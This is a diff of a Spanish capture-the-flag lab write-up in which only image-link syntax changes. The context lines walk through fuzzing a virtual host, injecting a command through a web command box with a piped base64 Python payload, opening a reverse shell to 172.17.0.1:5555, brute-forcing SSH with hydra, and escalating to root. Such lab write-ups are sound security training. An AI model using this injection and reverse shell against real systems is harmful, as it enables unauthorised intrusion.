@@ -6,7 +6,7 @@
 
 Realizamos un escaneo de puertos inicial con nmap para identificar los servicios activos en la máquina objetivo:
 
-![Pasted image 20260805000332.png](<../../../.gitbook/assets/Pasted image 20260805000332.png>)
+![[Pasted image 20260805000332.png]]
 
 **Servicios identificados:**
 
@@ -26,7 +26,7 @@ Realizamos un escaneo de puertos inicial con nmap para identificar los servicios
 
 Tras realizar fuzzing de directorios tradicionales en `internal.dl` sin resultados relevantes, procedemos a realizar fuzzing de virtual hosts para descubrir subdominios activos:
 
-![Pasted image 20260805001854.png](<../../../.gitbook/assets/Pasted image 20260805001854.png>)
+![[Pasted image 20260805001854.png]]
 
 * **Subdominio Descubierto:** Identificamos el subdominio `backup.internal.dl`. Lo agregamos a nuestro `/etc/hosts`:
 
@@ -38,7 +38,7 @@ Tras realizar fuzzing de directorios tradicionales en `internal.dl` sin resultad
 
 Al acceder a `backup.internal.dl` a través del navegador, encontramos una interfaz web con una caja de entrada de comandos:
 
-![Pasted image 20260805001914.png](<../../../.gitbook/assets/Pasted image 20260805001914.png>)
+![[Pasted image 20260805001914.png]]
 
 ***
 
@@ -56,7 +56,7 @@ Construimos un payload codificado en base64 que importa el módulo `os` de Pytho
 | printf "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScp" | base64 -d | python3
 ```
 
-![Pasted image 20260805004426.png](<../../../.gitbook/assets/Pasted image 20260805004426.png>)
+![[Pasted image 20260805004426.png]]
 
 * **Resultado:** La ejecución tiene éxito y nos devuelve el usuario `www-data`.
 
@@ -80,11 +80,11 @@ Enviamos la petición a través de Burp Suite con el payload codificado para URL
 |+printf+"aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2Jhc2ggLWMgXCJiYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvNTU1NSAwPiYxXCInKQ=="+|+base64+-d+|+python3
 ```
 
-![Pasted image 20260805004853.png](<../../../.gitbook/assets/Pasted image 20260805004853.png>)
+![[Pasted image 20260805004853.png]]
 
 Recibimos la conexión en nuestra máquina atacante en el puerto 5555:
 
-![Pasted image 20260805004919.png](<../../../.gitbook/assets/Pasted image 20260805004919.png>)
+![[Pasted image 20260805004919.png]]
 
 * **Estabilización de Shell (TTY):** Realizamos el tratamiento estándar de la terminal:
 
@@ -104,16 +104,16 @@ export TERM=xterm && export SHELL=bash
 
 Leemos el archivo `/etc/passwd` y localizamos al usuario `vault`:
 
-![Pasted image 20260805010809.png](<../../../.gitbook/assets/Pasted image 20260805010809.png>)
+![[Pasted image 20260805010809.png]]
 
 Realizamos una búsqueda de archivos en el sistema relacionados con este usuario o que contengan su nombre:
 
-![Pasted image 20260805010855.png](<../../../.gitbook/assets/Pasted image 20260805010855.png>)
+![[Pasted image 20260805010855.png]]
 
 * **Hallazgo:** Descubrimos el archivo `.vault_pass.txt` en el directorio de copias de seguridad de la web.
 * **Fuerza Bruta SSH:** Utilizamos las palabras o la credencial del archivo para realizar fuerza bruta al servicio SSH mediante hydra con el usuario `vault`:
 
-![Pasted image 20260805010926.png](<../../../.gitbook/assets/Pasted image 20260805010926.png>)
+![[Pasted image 20260805010926.png]]
 
 * **Resultado:** Obtenemos la contraseña correcta de SSH y nos conectamos al sistema:
 
@@ -121,7 +121,7 @@ Realizamos una búsqueda de archivos en el sistema relacionados con este usuario
 ssh vault@172.17.0.2
 ```
 
-![Pasted image 20260805011027.png](<../../../.gitbook/assets/Pasted image 20260805011027.png>)
+![[Pasted image 20260805011027.png]]
 
 #### Escalada a root (vaultctl)
 
@@ -134,7 +134,7 @@ Una vez iniciada la sesión como `vault`, buscamos binarios o permisos especiale
 /usr/local/bin/vaultctl
 ```
 
-![Pasted image 20260805011157.png](<../../../.gitbook/assets/Pasted image 20260805011157.png>)
+![[Pasted image 20260805011157.png]]
 
 * **Resultado:** Obtenemos acceso completo como root.
 
